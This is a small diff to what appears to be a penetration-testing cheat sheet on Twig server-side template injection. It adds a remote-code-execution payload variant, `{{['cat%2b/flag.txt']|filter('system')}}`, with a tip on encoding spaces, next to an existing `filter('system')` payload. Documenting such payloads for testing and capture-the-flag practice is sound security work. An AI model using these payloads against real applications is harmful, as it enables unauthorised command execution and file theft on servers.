@@ -73,6 +73,8 @@ he PHP web framework [Symfony](https://symfony.com/) defines additional Twig f
 
 For Remote Code Execution (RCE) : `{{ ['id'] | filter('system') }}`
 
+ > `{{['cat%2b/flag.txt']|filter('system')}}` : Now if we want to use a spaced command then we need to use `%2b` in between the commands.
+
 ## Tools of the Trade 
 **Installation Guide :**
 
